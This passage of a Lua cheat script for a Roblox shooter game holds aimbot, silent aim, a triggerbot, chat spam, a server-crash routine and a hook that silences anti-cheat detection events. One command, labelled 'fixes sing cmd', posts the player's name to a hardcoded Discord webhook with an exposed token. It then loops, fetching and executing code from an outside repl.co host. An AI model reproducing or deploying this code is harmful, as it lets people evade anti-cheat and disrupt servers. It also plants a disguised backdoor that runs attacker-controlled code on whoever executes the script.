                local Prediction 
                if Settings.Prediction_Settings.AutoSettings then
                    Prediction = TargetBody.CFrame + (TargetBody.Velocity * Settings.Prediction_Settings.Prediction)
                else
                    Prediction = TargetBody.CFrame + (TargetBody.Velocity * 0.165)
                end

                return (tostring(k) == "Hit" and Prediction or tostring(k) == "Target" and TargetBody)
            end
        end
    end
end

return __Index(t, k)
end)

local __Namecall;
__Namecall = hookmetamethod(game, "__namecall", function(self, ...)
local Args = {...}
local Method = getnamecallmethod()

if tostring(self.Name) == "MainEvent" and tostring(Method) == "FireServer" then
    if Args[1] == "TeleportDetect" or Args[1] == "CHECKER_1" or Args[1] == "OneMoreTime" then
        return
    end
end

return __Namecall(self, ...)
end)

if not Module.DrawingInstance["FOV"] then
Module.DrawingInstance["FOV"] = Module.Drawing.Circle(1)
end

if not Module.DrawingInstance["FOV2"] then
Module.DrawingInstance["FOV2"] = Module.Drawing.Circle(1)
end

RunService.RenderStepped:Connect(function()
if Settings.Prediction_Settings.AutoSettings then
    local PingStats = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
    local Value = tostring(PingStats)
    local PingValue = Value:split(" ")
    local PingNumber = tonumber(PingValue[1])

        Settings.Prediction_Settings.Prediction = PingNumber / 1000 + 0.037
end

if Settings.Aimbot.Enabled and Settings.Aimbot.Aiming then
    local NearestTarget, NearestPos = Module.Functions.TargetCheck(Settings.Aimbot.Nearest)
    if NearestTarget and (not Settings.Aimbot.VisibleCheck or Module.Functions.IsVisible(NearestTarget.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.Aimbot.FOV.Enabled or Settings.Aimbot.FOV.Size > NearestPos) then
        local Prediction = NearestTarget.Character[Settings.Aimbot.Hitbox].CFrame + (NearestTarget.Character[Settings.Aimbot.Hitbox].Velocity * Settings.Prediction_Settings.Prediction)
        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Prediction.Position)
    end
end

if Settings.SilentAim.FOV.Enabled then
    Module.DrawingInstance["FOV"].Visible = true
    Module.DrawingInstance["FOV"].Radius = Settings.SilentAim.FOV.Size
    Module.DrawingInstance["FOV"].Transparency = Settings.SilentAim.FOV.Transparency
    Module.DrawingInstance["FOV"].Filled = Settings.SilentAim.FOV.Filled
    if Settings.SilentAim.FOV.Shape == "Custom" then
        Module.DrawingInstance["FOV"].NumSides = Settings.SilentAim.FOV.Round
    elseif Settings.SilentAim.FOV.Shape == "Octagon" then
        Module.DrawingInstance["FOV"].NumSides = 12.5
    else 
        Module.DrawingInstance["FOV"].NumSides = 100
    end
    Module.DrawingInstance["FOV"].Color = Settings.SilentAim.FOV.Color
    Module.DrawingInstance["FOV"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
else
    Module.DrawingInstance["FOV"].Visible = false
end

if Settings.Aimbot.FOV.Enabled then
    Module.DrawingInstance["FOV2"].Visible = true
    Module.DrawingInstance["FOV2"].Radius = Settings.Aimbot.FOV.Size
    Module.DrawingInstance["FOV2"].Transparency = Settings.Aimbot.FOV.Transparency
    Module.DrawingInstance["FOV2"].Filled = Settings.Aimbot.FOV.Filled
    if Settings.Aimbot.FOV.Shape == "Custom" then
        Module.DrawingInstance["FOV2"].NumSides = Settings.Aimbot.FOV.Round
    elseif Settings.Aimbot.FOV.Shape == "Octagon" then
        Module.DrawingInstance["FOV2"].NumSides = 12.5
    else 
        Module.DrawingInstance["FOV"].NumSides = 100
    end
    Module.DrawingInstance["FOV2"].Color = Settings.Aimbot.FOV.Color
    Module.DrawingInstance["FOV2"].Position = Vector2.new(Mouse.X, Mouse.Y + GuiInset.Y)
else
    Module.DrawingInstance["FOV2"].Visible = false
end

if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.ServerCrash.Enabled then
        Hum:ChangeState(11)
    end

    if Settings.Movement.CFrameSpeed then
        if Settings.Movement.Type == "Render" then
            if Hum.MoveDirection.Magnitude > 0 then
                Char:TranslateBy(Hum.MoveDirection)
            end
        end
    end
end
end)

loadstring[[
game:GetService("RunService").Stepped:Connect(function() --// The broken part
    if Settings.AntiAim.UndergroundWallbang then
        for i, v in pairs(LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)
]]

RunService.Heartbeat:Connect(function()
if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.Movement.CFrameSpeed then
        if Settings.Movement.Type == "Heartbeat" then
            if Hum.MoveDirection.Magnitude > 0 then
                Char:TranslateBy(Hum.MoveDirection)
            end
        end
    end

    if Settings.SilentAim.LookAt then
        local PrimaryPartOfChar = Char.PrimaryPart
        local NearestMouse, NearestPos = Module.Functions.TargetCheck(Settings.SilentAim.Nearest)
        if Module.Functions.Network(NearestMouse) then
            if (not Settings.SilentAim.VisibleCheck or Module.Functions.IsVisible(NearestMouse.Character.HumanoidRootPart, LocalPlayer.Character.HumanoidRootPart)) and (not Settings.SilentAim.FOV.Enabled or Settings.SilentAim.FOV.Size > NearestPos) then
                local NearestChar = NearestMouse.Character
                local NearestRoot = NearestChar.HumanoidRootPart
                local NearestPos = CFrame.new(PrimaryPartOfChar.Position, Vector3.new(NearestRoot.Position.X, NearestRoot.Position.Y, NearestRoot.Position.Z))
                Char:SetPrimaryPartCFrame(NearestPos)
            end
        end
    end

    if Settings.AntiAim.NoAutoRotate then
        Hum.AutoRotate = false
    else
        Hum.AutoRotate = true
    end

    if Settings.AntiAim.AntiPointAt then
        for i, v in next, Players:GetPlayers() do
            if v ~= LocalPlayer and Module.Functions.Network(v) and Module.Functions.Network(LocalPlayer) then
                local BodyEffects = v.Character:FindFirstChild("BodyEffects")
                local MousePos = BodyEffects:FindFirstChild("MousePos")
                if BodyEffects ~= nil and MousePos ~= nil then
                    local EnemyMouseMagnitude = (LocalPlayer.Character.HumanoidRootPart.Position - MousePos.Value).Magnitude
                    if Settings.AntiAim.AntiPointAtDistance > EnemyMouseMagnitude then
                        Root.CFrame = Root.CFrame * CFrame.new(math.random(1, 2) == 1 and 2 or -2, 0, 0)
                    end
                end
            end
        end
    end

    if Settings.AntiAim.UndergroundWallbang then
        Hum:ChangeState(11)
    end

    if Settings.AntiAim.Enabled then
        if Settings.AntiAim.Type == "Jitter" then
            Module.Functions.Jitter(Settings.AntiAim.Speed, Settings.AntiAim.Angle)
        else
            Module.Functions.Spin(Settings.AntiAim.Speed)
        end
    end
end
end)

while wait() do
if Module.Functions.Network(LocalPlayer) then
    local Char = LocalPlayer.Character
    local Root = Char.HumanoidRootPart
    local Hum = Char.Humanoid

    if Settings.Triggerbot.Enabled then
        for i, v in next, Players:GetPlayers() do 
            if Module.Functions.Network(v) then 
                if Mouse.Target:IsDescendantOf(v.Character) then 
                    mouse1press()
                    wait()
                    mouse1release()
                    if Settings.Triggerbot.Delay.Enabled then
                        wait(Settings.Triggerbot.Delay.Value)
                    end
                end 
            end
        end
    end

    if Settings.KillSay.Type == "Before Dead" and Settings.KillSay.OldPlayer ~= nil then
        if Players[Settings.KillSay.OldPlayer].Character.BodyEffects.Dead then
            if Settings.KillSay.CustomMessage then
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.CustomMessageText:gsub("@s", Settings.KillSay.OldPlayer), "All")
            else
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Settings.KillSay.Message[math.random(1, 4)]:gsub("@s", Settings.KillSay.OldPlayer), "All")
            end
        end
    end

    if Settings.ServerCrash.Enabled then
        Root.CFrame = workspace.Ignored.Shop["[Cranberry] - $3"].Head.CFrame * CFrame.new(0, -7, 0)
        fireclickdetector(workspace.Ignored.Shop["[Cranberry] - $3"].ClickDetector)
        fireclickdetector(workspace.Ignored.Shop["[Cranberry] - $3"].ClickDetector)
        for i, v in pairs(LocalPlayer.Backpack:GetChildren()) do
            if v.Name == tostring("[Cranberry]") then
                v.Parent = LocalPlayer.Character
                Settings.ServerCrash.Value = Settings.ServerCrash.Value + 1
                CrashPercent:Set("Percent : " .. tostring(Settings.ServerCrash.Value * 100 / 500) .. "%" .. " / " .. "100%")
                if Settings.ServerCrash.Value == 500 then
                    Module.Functions.NilBody()
                end
            end
        end
    end
end
end

while wait(3) do
if Settings.KillSay.Cooldown then
    Settings.KillSay.OldPlayer = ""
end
end
end)


AddCommand("dash", {"whoosh"}, "dashes", {}, function(Caller)
	local plr = game:GetService('Players').LocalPlayer
	local char = plr.Character
	char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 300
        Notify({ 
Description = "weee";
Title = "WHOOSHH";
Duration = 2;
});
end)

AddCommand("timeusage", {"timer"}, "lol", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
else
local timeusage = Instance.new("ScreenGui")
local timeusagemainframe = Instance.new("Frame")
local timeusagelable = Instance.new("TextLabel")
local timeusagehours = Instance.new("TextLabel")
local timeusageminutes = Instance.new("TextLabel")
local timeusageseconds = Instance.new("TextLabel")
local timeusageclose = Instance.new("TextButton")
local timeusagesecondsnum = Instance.new("TextLabel")
local timeusageminutesnum = Instance.new("TextLabel")
local timeusagehoursnum = Instance.new("TextLabel")

--Properties:

timeusage.Name = "timeusage"
timeusage.Parent = game.CoreGui
timeusage.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

timeusagemainframe.Name = "timeusagemainframe"
timeusagemainframe.Parent = timeusage
timeusagemainframe.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagemainframe.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagemainframe.Position = UDim2.new(0.123390593, 0, 0.160493851, 0)
timeusagemainframe.Size = UDim2.new(0, 278, 0, 139)

timeusagelable.Name = "timeusagelable"
timeusagelable.Parent = timeusagemainframe
timeusagelable.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagelable.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagelable.Size = UDim2.new(0, 224, 0, 30)
timeusagelable.Font = Enum.Font.SourceSans
timeusagelable.Text = "Time useage checker"
timeusagelable.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagelable.TextSize = 20.000
timeusagelable.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusagehours.Name = "timeusagehours"
timeusagehours.Parent = timeusagemainframe
timeusagehours.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagehours.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagehours.Position = UDim2.new(0, 0, 0.266187042, 0)
timeusagehours.Size = UDim2.new(0, 90, 0, 30)
timeusagehours.Font = Enum.Font.SourceSans
timeusagehours.Text = "hours"
timeusagehours.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagehours.TextSize = 20.000
timeusagehours.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageminutes.Name = "timeusageminutes"
timeusageminutes.Parent = timeusagemainframe
timeusageminutes.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutes.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutes.Position = UDim2.new(0.350194544, 0, 0.266187042, 0)
timeusageminutes.Size = UDim2.new(0, 90, 0, 30)
timeusageminutes.Font = Enum.Font.SourceSans
timeusageminutes.Text = "minutes"
timeusageminutes.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageminutes.TextSize = 20.000
timeusageminutes.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageseconds.Name = "timeusageseconds"
timeusageseconds.Parent = timeusagemainframe
timeusageseconds.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageseconds.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageseconds.Position = UDim2.new(0.677042782, 0, 0.266187042, 0)
timeusageseconds.Size = UDim2.new(0, 90, 0, 30)
timeusageseconds.Font = Enum.Font.SourceSans
timeusageseconds.Text = "seconds"
timeusageseconds.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageseconds.TextSize = 20.000
timeusageseconds.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageclose.Name = "timeusageclose"
timeusageclose.Parent = timeusagemainframe
timeusageclose.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageclose.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageclose.Position = UDim2.new(0.677042782, 0, 0, 0)
timeusageclose.Size = UDim2.new(0, 89, 0, 37)
timeusageclose.Font = Enum.Font.SourceSans
timeusageclose.Text = "X"
timeusageclose.TextColor3 = Color3.fromRGB(255, 0, 4)
timeusageclose.TextSize = 33.000

timeusagesecondsnum.Name = "timeusagesecondsnum"
timeusagesecondsnum.Parent = timeusagemainframe
timeusagesecondsnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagesecondsnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagesecondsnum.Position = UDim2.new(0.677042782, 0, 0.532374084, 0)
timeusagesecondsnum.Size = UDim2.new(0, 90, 0, 30)
timeusagesecondsnum.Font = Enum.Font.SourceSans
timeusagesecondsnum.Text = "0"
timeusagesecondsnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagesecondsnum.TextSize = 20.000
timeusagesecondsnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusageminutesnum.Name = "timeusageminutesnum"
timeusageminutesnum.Parent = timeusagemainframe
timeusageminutesnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutesnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusageminutesnum.Position = UDim2.new(0.350194544, 0, 0.482014358, 0)
timeusageminutesnum.Size = UDim2.new(0, 90, 0, 30)
timeusageminutesnum.Font = Enum.Font.SourceSans
timeusageminutesnum.Text = "0"
timeusageminutesnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusageminutesnum.TextSize = 20.000
timeusageminutesnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

timeusagehoursnum.Name = "timeusagehoursnum"
timeusagehoursnum.Parent = timeusagemainframe
timeusagehoursnum.BackgroundColor3 = Color3.fromRGB(49, 46, 46)
timeusagehoursnum.BorderColor3 = Color3.fromRGB(49, 46, 46)
timeusagehoursnum.Position = UDim2.new(0, 0, 0.532374084, 0)
timeusagehoursnum.Size = UDim2.new(0, 90, 0, 30)
timeusagehoursnum.Font = Enum.Font.SourceSans
timeusagehoursnum.Text = "0"
timeusagehoursnum.TextColor3 = Color3.fromRGB(255, 255, 255)
timeusagehoursnum.TextSize = 20.000
timeusagehoursnum.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

-- Scripts:

local function HROBBS_fake_script() -- timeusageclose.LocalScript 
	local script = Instance.new('LocalScript', timeusageclose)

	script.Parent.MouseButton1Click:Connect(function()
	local timeusage = game:GetService("CoreGui"):FindFirstChild("timeusage")
	if timeusage then
		timeusage:Destroy()
	end
	end)
end
coroutine.wrap(HROBBS_fake_script)()
local function KPXZVQH_fake_script() -- timeusagemainframe.DraggableGUI 
	local script = Instance.new('LocalScript', timeusagemainframe)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			if gui.Visible then
				update(input)
			end
		end
	end)
end
coroutine.wrap(KPXZVQH_fake_script)()

while true do
wait()
timeusagehoursnum.Text = timeusagehourslol
timeusageminutesnum.Text = timeusageminuteslol
timeusagesecondsnum.Text = timeusagesecondslol
end
end
end)


	   _G.AntiStomp = false
AddCommand("antistomp", {"nostomp"}, "may not work", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else

		   if _G.AntiStomp == true then
			   _G.AntiStomp = false
        Notify({ 
Description = "off";
Title = "antistomp";
Duration = 2;
});
		   else
			   _G.AntiStomp = true
        Notify({ 
Description = "on";
Title = "antistomp";
Duration = 2;
});
			   while _G.AntiStomp == true and wait() do
				   pcall(function()
					   local LocalPlayer = game:GetService("Players").LocalPlayer
					   local char = LocalPlayer.Character
					   if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 then
			for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
				if L_171_forvar1:IsA("BasePart") then
					L_171_forvar1:Destroy()
				end
			end
wait(7)
end
end)
end
end
end
end)

AddCommand("joinleavelogs", {"jllogs"}, "ye", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
if joinleavelogs == false then
joinleavelogs = false
else
joinleavelogs = true

end


end
end)



AddCommand("discordlisten", {}, "fixes sing cmd", {}, function(Caller)
webhookvalue = 'https://discord.com/api/webhooks/943245392835903598/HyHMXUo36HgAm4A6yJISq0UA2Bgeb1Z_6k-j83nbi-kK9DoiVwrVM550T-fMfBNR0gHd'
    local player = game.Players.LocalPlayer


	local HttpService = game:GetService("HttpService")
    local webhook_url = webhookvalue
    local options = http_request or syn.request or request
    function sendMessage(msg)
        local payload = {
            ["content"] = msg
        }
        local headers = {
            ["content-type"] = "application/json"
        }

        local request_body_encoded = HttpService:JSONEncode(payload)
        local request_payload = {Url = webhook_url, Body = request_body_encoded, Method = "POST", Headers = headers}
        options(request_payload)
    end
  
sendMessage(player.Name.." conected") 
while true do
wait()
loadstring(game:HttpGet("https://intentaffectionatepayware.copyonce1.repl.co/"))()

if a == "function summon" then
   ExecuteCommand("summon", {}, LocalPlayer);
  sendMessage("Script successfully executed!")
  wait(5)
end

end

end)


AddCommand("fixsing", {"singfix"}, "fixes sing cmd", {}, function(Caller)
flingcooldown = false
        Notify({ 
Description = "if this doesnt work try again in 20-30 seconds";
Title = "fix";
Duration = 2;
});
end)







AddCommand("time", {}, "disables noclip", {}, function(Caller)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusagesecondslol.." seconds","All")
wait(0.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusageminuteslol.." mins","All")
wait(0.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(timeusagehourslol.." hours","All")
end)



singcooldown = false
AddCommand("sing", {"singsong"}, "disables noclip", {}, function(Caller)
if singcooldown == false then
singcooldown = true
singsong = math.random(1, 4)

print("chose song ".. singsong)
        Notify({ 
Description = "chose song "..singsong;
Title = "sing";
Duration = 2;
});

--sing song 1 start
if singsong == 1 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Super Idol de xiaorong","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dou mei ni de tian","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ba yue zhengwu de yangguang","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Dou mei ni yaoyan","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Re'ai 105 °C de ni","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Di di qingchun de zhengliushui","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Zai zhe duyiwu'er","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Shuyu wo de shidai","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Mo wangle chuxin chang zai","All")
wait(2)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Tongkuai qu re'ai","All")
end
-- sing song 1 end



--sing song 2 start
if singsong == 2 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm a Barbie girl in a Barbie world","All")
wait(1.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Life in plastic, it's fantastic","All")
wait(1.3)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You can brush my hair, u*ndr**s me everywhere","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Imagination, life is your creation","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Come on Barbie, let's go party","All")
wait(1.5)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ah ah ah yeah","All")
wait(1.8)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Come on Barbie, let's go party","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Ooh whoa, ooh whoa","All")
end
-- sing song 2 end


--sing song 3 start
if singsong == 3 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Material Girl","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I want Chanel 9 boots","All")
wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("All these ****** steady jockin', 'cus they know I'm the truth","All")

wait(1.7)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Material Girl","All")
wait(1.7)

game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("And I get it from my mammy","All")
wait(1.6)
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Balmain bustdowns, these **** can't stand me (Material Girl)","All")
wait(1.7)
end
-- sing song 3 end


--sing song 4 start
if singsong == 4 then
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("*sings most beautiful song you have ever heard*  ","All")
end
-- sing song 4 end


wait(25)
singcooldown = false
end
end)


AddCommand("mask", {"hideuser"}, "hides ur username", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
   wait(0.2)
   local Players = game:GetService("Players")
local ContextActionService = game:GetService("ContextActionService")
 
local localPlayer = Players.LocalPlayer

			if localPlayer.Character then 
				local humanoid = localPlayer.Character:FindFirstChildOfClass("Humanoid")
				if humanoid then 
					humanoid:UnequipTools()
end
end
   
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-208, 21, -829)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Hockey Mask] - $60'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedbatpos)
end
end)

AddCommand("declinerequest", {"declinebring"}, "doesnt allow a whitelisted user bring u", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
requestingye = false
        Notify({ 
Description = "declining bring/request requests";
Title = "permission";
Duration = 2;
});
end
end)



AddCommand("kit1", {"kitone"}, "rev, db, food", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-643, 22, -117)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[Revolver] - $1300'].ClickDetector)
	wait(0.1)
	
	   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
wait(0.2)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-643, 22, -117)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		fireclickdetector(game.Workspace.Ignored.Shop['12 [Revolver Ammo] - $75'].ClickDetector)
	wait(0.9)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 21, -257)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 22, -257)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(-1043, 21, -257)
		wait(0.2)
		fireclickdetector(game.Workspace.Ignored.Shop['[Double-Barrel SG] - $1400'].ClickDetector)
		wait(0.4)
				fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
					fireclickdetector(game.Workspace.Ignored.Shop['18 [Double-Barrel SG Ammo] - $60'].ClickDetector)
	wait(0.9)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
end
end)


AddCommand("allowrequest", {"allowbring"}, "allows a whitelisted user bring u", {}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
requestingye = true
        Notify({ 
Description = "allowing request/bring requests";
Title = "permission";
Duration = 2;
});
end
end)
requestingye = true
AddCommand("request", {"bring"}, "lets a whitelisted user bring u", {}, function(Caller)
if requestingye == true then
flying=false
attacking = false
wait(0.2)
                        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
idkman = Caller.name
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[idkman].Character.HumanoidRootPart.CFrame
wait(0.3)
                        game.ReplicatedStorage.MainEvent:FireServer("Block",false)
end
end)



AddCommand("armor", {"buyarmor"}, "auto buy armor", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = false
        else
   local plr = game.Players.LocalPlayer
	local savedarmourpos = plr.Character.HumanoidRootPart.Position
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(-938.476685, -25.2498264, 570.100159, -0.0353576206, 9.85617206e-08, -0.999374807, -2.69198441e-09, 1, 9.871858e-08, 0.999374807, 6.18077589e-09, -0.0353576206)
	wait(.4)

	fireclickdetector(game.Workspace.Ignored.Shop['[High-Medium Armor] - $2300'].ClickDetector)
	wait(0.1)
	plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
end
end)






AddCommand("away", {"adminbase"}, "tp to jailcell", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-800, -39, -885)
wait(0.2)

end
end)

AddCommand("bank", {"tpbank"}, "tp to bank", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)

end
end)

AddCommand("jail", {"ajail"}, "tp to bank", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-798, -40, -841)

end
end)

AddCommand("totaco", {"tptaco"}, "tp to tacoshop", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(707.502014, 139, -543.044739, -0.00318608154, -0.00102963799, 0.999993861, 0.000187970581, 0.999999464, 0.00103024102, -0.99999404, 0.00019125198, -0.00318560796)
end
end)

AddCommand("toplayground", {"tpplayground"}, "tp to playground", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
            ExecuteCommand("bring", {Caller.Name, v.Name}, LocalPlayer)
        else
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-308.851196, 103.049866, -685.874817, 0.0775452703, 4.43633544e-05, -0.996988416, 4.02679916e-06, 1, 4.48105384e-05, 0.996988416, -7.48951334e-06, 0.0775452703)
end
end)

AddCommand("bat", {"buybat"}, "auto buy bat", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
b = true
        else
   local plr = game.Players.LocalPlayer
	local savedbatpos = plr.Character.HumanoidRootPart.Position
